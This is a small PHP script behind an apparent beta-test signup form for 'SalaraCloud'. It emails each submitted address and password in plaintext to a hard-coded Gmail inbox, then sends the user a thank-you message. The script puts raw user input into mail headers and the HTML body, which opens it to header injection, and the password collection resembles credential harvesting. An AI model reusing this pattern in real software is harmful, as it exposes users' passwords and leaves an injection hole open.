<?php 

$sendto   = "gmstudio.classic@gmail.com"; // почта, на которую будет приходить письмо
$userpass = $_POST['pass'];
$usermail = $_POST['mail'];
 
// Формирование заголовка письма
$subject  = "Участие в бета-тесте SalaraCloud";
$headers  = "From: " . strip_tags($usermail) . "\r\n";
$headers .= "Reply-To: ". strip_tags($usermail) . "\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html;charset=utf-8 \r\n";
 
// Формирование тела письма
$msg  = "<html><body style='font-family:Arial,sans-serif;'>";
$msg .= "<h2 style='font-weight:bold;border-bottom:1px dotted #ccc;'>Бета-тест SalaraCloud</h2>\r\n";
$msg .= "<p><strong>Данные аккаунта:</strong></p>\r\n";
$msg .= "<p><strong>Почта:</strong> ".$usermail."</p>\r\n";
$msg .= "<p><strong>Пароль:</strong> ".$userpass."</p>\r\n";
$msg .= "</body></html>";
 
$send   = $usermail;
	// Формирование заголовка письма
$subj  = "Участие в бета-тесте SalaraCloud";
$head  = "From: " . strip_tags("gmstudio.classic@gmail.com") . "\r\n";
$head .= "Reply-To: ". strip_tags("gmstudio.classic@gmail.com") . "\r\n";
$head .= "MIME-Version: 1.0\r\n";
$head .= "Content-Type: text/html;charset=utf-8 \r\n";
 
	// Формирование тела письма
$msge  = "<html><body style='font-family:Arial,sans-serif;'>";
$msge .= "<h2 style='font-weight:bold;border-bottom:1px dotted #ccc;'>Команда GeekMere Inc.</h2>\r\n";
$msge .= "<p> Благодарим вас за участие в бета-тесте.</p>\r\n";
$msge .= "<p> В скором времени вам будет выслана копия продукта для тестирования</p>\r\n";
$msge .= "<p><strong>С уважением, GeekMere Inc.</strong></p>\r\n";
$msge .= "</body></html>";

// отправка сообщения
if(@mail($sendto, $subject, $msg, $headers) and @mail($send, $subj, $msge, $head)) {
    header ('Location: /all_pages/beta-salara.html');  // перенаправление на нужную страницу
    exit();    // прерываем работу скрипта, чтобы забыл о прошлом
} else {
    echo "<b>Спасибо за помощь.</b>";
}
 
?>